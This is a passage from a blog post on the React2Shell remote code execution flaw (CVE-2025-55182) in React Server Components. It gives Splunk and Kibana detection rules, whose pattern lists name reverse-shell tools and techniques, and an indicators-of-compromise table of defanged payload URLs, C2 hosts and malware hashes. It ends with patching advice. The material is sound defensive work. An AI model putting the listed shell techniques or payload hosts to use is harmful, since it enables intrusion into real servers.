</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="p">|</span> tstats <span class="sb">`</span>security_content_summariesonly<span class="sb">`</span> count min<span class="o">(</span>_time<span class="o">)</span> as firstTime max<span class="o">(</span>_time<span class="o">)</span> as lastTime
</span></span><span class="line"><span class="cl">  from <span class="nv">datamodel</span><span class="o">=</span>Endpoint.Processes
</span></span><span class="line"><span class="cl">  where
</span></span><span class="line"><span class="cl">    Processes.parent_process_name <span class="o">=</span> <span class="s2">&#34;node&#34;</span>
</span></span><span class="line"><span class="cl">    Processes.parent_process IN <span class="o">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*--experimental-https*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*--experimental-next-config-strip-types*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*/node_modules/next*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*next dev*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*next start*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*node_modules/.bin*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*react-scripts start*&#34;</span>,
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;*start-server.js*&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">)</span>
</span></span><span class="line"><span class="cl">    AND <span class="o">(</span>
</span></span><span class="line"><span class="cl">      Processes.process_name IN <span class="o">(</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;awk&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;gawk&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ifconfig&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;lua&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;nc&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ncat&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;netcat&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;openssl&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;perl&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;php&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;python&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;python2&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;python3&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ruby&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;socat&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;telnet&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="o">)</span>
</span></span><span class="line"><span class="cl">      OR <span class="o">(</span>
</span></span><span class="line"><span class="cl">        Processes.process_name IN <span class="o">(</span><span class="s2">&#34;curl&#34;</span>, <span class="s2">&#34;wget&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        Processes.process <span class="o">=</span> <span class="s2">&#34;*
</span></span></span><span class="line"><span class="cl"><span class="s2">|*&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="o">)</span>
</span></span><span class="line"><span class="cl">      OR <span class="o">(</span>
</span></span><span class="line"><span class="cl">        Processes.process_name IN <span class="o">(</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;bash&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;dash&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;sh&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">)</span>
</span></span><span class="line"><span class="cl">        NOT Processes.process <span class="o">=</span> <span class="s2">&#34;*-c*&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="o">)</span>
</span></span><span class="line"><span class="cl">      OR <span class="o">(</span>
</span></span><span class="line"><span class="cl">        Processes.process_name IN <span class="o">(</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;bash&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;dash&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;ksh&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;sh&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;zsh&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">)</span>
</span></span><span class="line"><span class="cl">        Processes.process IN <span class="o">(</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*/dev/tcp/*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*/dev/udp/*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*0&gt;&amp;1*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*curl*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*exec *&gt;&amp;*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*fsockopen*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*ifconfig*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*mkfifo*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*nc *&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*ncat*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*netcat*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*proc_open*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*s_client*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*socat*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*socket*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*subprocess*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*TCPSocket*&#34;</span>,
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;*wget*&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">by Processes.action Processes.dest Processes.original_file_name Processes.parent_process
</span></span><span class="line"><span class="cl">   Processes.parent_process_exec Processes.parent_process_guid Processes.parent_process_id
</span></span><span class="line"><span class="cl">   Processes.parent_process_name Processes.parent_process_path Processes.process
</span></span><span class="line"><span class="cl">   Processes.process_exec Processes.process_guid Processes.process_hash Processes.process_id
</span></span><span class="line"><span class="cl">   Processes.process_integrity_level Processes.process_name Processes.process_path
</span></span><span class="line"><span class="cl">   Processes.user Processes.user_id Processes.vendor_product
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="sb">`</span>drop_dm_object_name<span class="o">(</span>Processes<span class="o">)</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="sb">`</span>security_content_ctime<span class="o">(</span>firstTime<span class="o">)</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="sb">`</span>security_content_ctime<span class="o">(</span>lastTime<span class="o">)</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="sb">`</span>linux_suspicious_react_or_next_js_child_process_filter<span class="sb">`</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="kibana"><em><strong>Kibana</strong></em><a hidden class="anchor" aria-hidden="true" href="#kibana">#</a></h3>
<p>This rule detects exploitation attempts targeting CVE-2025-55182, a critical remote code execution vulnerability in React’s Flight protocol used by Next.js and other RSC implementations. The vulnerability stems from insecure prototype chain traversal in the Flight deserializer, allowing attackers to access <code>__proto__</code>, <code>constructor</code>, and ultimately the <code>Function</code> constructor to execute arbitrary code.</p>
<p><strong>Possible investigation steps</strong></p>
<ul>
<li>Examine the full HTTP request body to identify the specific attack payload and command being executed.</li>
<li>Check the response body for <code>E{&quot;digest&quot;:&quot;...&quot;}</code> patterns which contain command output from successful exploitation.</li>
<li>Identify the target application and verify if it runs vulnerable React (&lt; 19.1.0) or Next.js (&lt; 15.3.2) versions.</li>
<li>Review the source IP for other reconnaissance or exploitation attempts against web applications.</li>
<li>Check for the <code>Next-Action</code> header which is required for the exploit to work.</li>
<li>Correlate with process execution logs to identify if child processes (e.g., shell commands) were spawned by the Node.js process.</li>
</ul>
<p><strong>False positive analysis</strong></p>
<ul>
<li>Legitimate React Server Components traffic will NOT contain <code>__proto__</code>, <code>constructor:constructor</code>, or code execution patterns.</li>
<li>Security scanning tools like react2shell-scanner may trigger this rule during authorized penetration testing.</li>
<li>The combination of prototype pollution patterns with RSC-specific syntax is highly indicative of malicious activity.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">network where http.request.method <span class="o">==</span> <span class="s2">&#34;POST&#34;</span> and
</span></span><span class="line"><span class="cl"><span class="o">(</span>
</span></span><span class="line"><span class="cl">    // Successful CVE-2025-55182 RCE - <span class="nb">command</span> output in digest
</span></span><span class="line"><span class="cl">    <span class="o">(</span>
</span></span><span class="line"><span class="cl">        http.response.status_code in <span class="o">(</span>500, 303<span class="o">)</span> and
</span></span><span class="line"><span class="cl">        http.response.body.content like~ <span class="s2">&#34;*E{\\&#34;</span>digest<span class="se">\\</span><span class="s2">&#34;*&#34;</span> and
</span></span><span class="line"><span class="cl">        http.request.body.content regex~ <span class="s2">&#34;&#34;&#34;.*\\</span>$<span class="s2">[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">)</span> or
</span></span><span class="line"><span class="cl">    // Prototype pollution attempts in RSC Flight data <span class="o">(</span>never legitimate<span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">(</span>
</span></span><span class="line"><span class="cl">        http.request.body.content regex~ <span class="s2">&#34;&#34;&#34;.*\\</span>$<span class="s2">[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*&#34;&#34;&#34;</span> and
</span></span><span class="line"><span class="cl">        <span class="o">(</span>
</span></span><span class="line"><span class="cl">            http.request.body.content like~ <span class="s2">&#34;*__proto__*&#34;</span> or
</span></span><span class="line"><span class="cl">            http.request.body.content like~ <span class="s2">&#34;*prototype*&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="indicators-of-compromise"><em><strong>Indicators of compromise</strong></em><a hidden class="anchor" aria-hidden="true" href="#indicators-of-compromise">#</a></h3>
<p>The list below is non-exhaustive and does not represent all indicators of compromise observed in the known campaigns:</p>
<table>
  <thead>
      <tr>
          <th>Indicator</th>
          <th>Type</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>c6c7e7dd85c0578dd7cb24b012a665a9d5210cce8ff735635a45605c3af1f6adb568582240509227ff7e79b6dc73c933dcc3fae674e9244441066928b1ea056069f2789a539fc2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0fd60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171</td>
          <td>SHA-256</td>
          <td>Coin miner payload hashes</td>
      </tr>
      <tr>
          <td>b33d468641a0d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8ad71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4db5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec84cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4df347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e132ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f77e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e55cd737980322de37c2c2792154b4cf4e4893e9908c2819026e5f</td>
          <td>SHA-256</td>
          <td>Backdoor payload hashes</td>
      </tr>
      <tr>
          <td>hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.archxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.i686hxxp://194[.]69[.]203[.]32:81/hiddenbink/react.shhxxp://162[.]215[.]170[.]26:3000/sex.shhxxp://216[.]158[.]232[.]43:12000/sex.shhxxp://196[.]251[.]100[.]191/no_killer/Exodus.arm4hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86_64hxxp://196[.]251[.]100[.]191/update.shhxxp://anywherehost[.]site/xms/k1.shhxxp://anywherehost[.]site/xms/kill2.shhxxps://overcome-pmc-conferencing-books[.]trycloudflare[.]com/p.pnghxxp://donaldjtrmp.anondns.net:1488/labubuhxxp://labubu[.]anondns[.]net:1488/donghxxp://krebsec[.]anondns[.]net:2316/donghxxps://hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agenthxxps://ghostbin[.]axel[.]org/paste/evwgo/rawhxxp://xpertclient[.]net:3000/sex.shhxxp://superminecraft[.]net[.]br:3000/sex.sh</td>
          <td>URLs</td>
          <td>Various payload download URLs</td>
      </tr>
      <tr>
          <td>194.69.203[.]32162.215.170[.]26216.158.232[.]43196.251.100[.]19146.36.37[.]8592.246.87[.]48</td>
          <td>IP addresses</td>
          <td>C2</td>
      </tr>
      <tr>
          <td>anywherehost[.]sitexpertclient[.]netvps-zap812595-1[.]zap-srv[.]comsuperminecraft[.]net[.]brovercome-pmc-conferencing-books[.]trycloudflare[.]comdonaldjtrmp[.]anondns[.]netlabubu[.]anondns[.]netkrebsec[.]anondns[.]nethybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]comghostbin[.]axel[.]org</td>
          <td>Domains</td>
          <td>C2</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="mitigation-strategies"><strong>Mitigation Strategies</strong><a hidden class="anchor" aria-hidden="true" href="#mitigation-strategies">#</a></h2>
<h3 id="patch-immediately"><em><strong>Patch immediately</strong></em><a hidden class="anchor" aria-hidden="true" href="#patch-immediately">#</a></h3>
<ul>
<li>React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line):
<ul>
<li>React: 19.0.1, 19.1.2, 19.2.1</li>
<li>Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7</li>
</ul>
</li>
<li>Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies.</li>
</ul>
<h3 id="prioritize-exposed-services"><em><strong>Prioritize exposed services</strong></em><a hidden class="anchor" aria-hidden="true" href="#prioritize-exposed-services">#</a></h3>
<ul>
<li>Patch all affected systems, starting with internet-facing workloads.</li>
<li>Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate.</li>
</ul>
<h3 id="monitor-for-exploit-activity"><em><strong>Monitor for exploit activity</strong></em><a hidden class="anchor" aria-hidden="true" href="#monitor-for-exploit-activity">#</a></h3>
<ul>
<li>Review MDVM dashboards and Defender alerts for indicators of attempted exploitation.</li>
<li>Correlate endpoint, container, and cloud signals for higher confidence triage.</li>
<li>Invoke incident response process to address any related suspicious activity stemming from this vulnerability.</li>
</ul>
<h3 id="add-waf-protections-where-appropriate"><em><strong>Add WAF protections where appropriate</strong></em><a hidden class="anchor" aria-hidden="true" href="#add-waf-protections-where-appropriate">#</a></h3>
<ul>
<li>Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has <a href="https://techcommunity.microsoft.com/blog/azurenetworksecurityblog/protect-against-react-rsc-cve-2025-55182-with-azure-web-application-firewall-waf/4475291">published rule guidance and JSON examples</a> in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified.</li>
</ul>
<hr>
<h2 id="references-and-further-reading"><strong>References and further reading</strong><a hidden class="anchor" aria-hidden="true" href="#references-and-further-reading">#</a></h2>
<ul>
<li><a href="https://tryhackme.com/room/react2shellcve202555182">TryHackMe Lab</a></li>
<li><a href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components">Official React Advisory</a></li>
<li><a href="https://www.facebook.com/security/advisories/cve-2025-55182">Official React Advisory - Facebook</a></li>
<li><a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components -<strong>MSRC</strong></a></li>
<li><a href="https://www.youtube.com/watch?v=jwzeJU_62IQ">https://www.youtube.com/watch?v=jwzeJU_62IQ</a></li>
<li><a href="https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http">https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http</a></li>
<li><a href="https://www.elastic.co/guide/en/security/current/react2shell-cve-2025-55182-exploitation-attempt.html">https://www.elastic.co/guide/en/security/current/react2shell-cve-2025-55182-exploitation-attempt.html</a></li>
<li><a href="https://research.splunk.com/endpoint/cda04e9c-1950-43ab-87d6-e333a3d7f107/">https://research.splunk.com/endpoint/cda04e9c-1950-43ab-87d6-e333a3d7f107/</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/cve-2025-55182/">CVE-2025-55182</a></li>
      <li><a href="http://localhost:1313/tags/react2shell/">React2Shell</a></li>
      <li><a href="http://localhost:1313/tags/tryhackme/">TryHackMe</a></li>
      <li><a href="http://localhost:1313/tags/rce/">RCE</a></li>
      <li><a href="http://localhost:1313/tags/insecure_deserialization/">Insecure_Deserialization</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/iran/">
    <span class="title">« Prev</span>
    <br>
    <span>Cyber Frontlines - How the Iran War Is Reshaping Global Cybersecurity</span>
  </a>
  <a class="next" href="http://localhost:1313/posts/search/">
    <span class="title">Next »</span>
    <br>
    <span>Search</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on x"
            href="https://x.com/intent/tweet/?text=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f&amp;hashtags=CVE-2025-55182%2cReact2Shell%2cTryHackMe%2cRCE%2cInsecure_Deserialization">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f&amp;title=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown&amp;summary=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f&title=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on whatsapp"
            href="https://api.whatsapp.com/send?text=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on telegram"
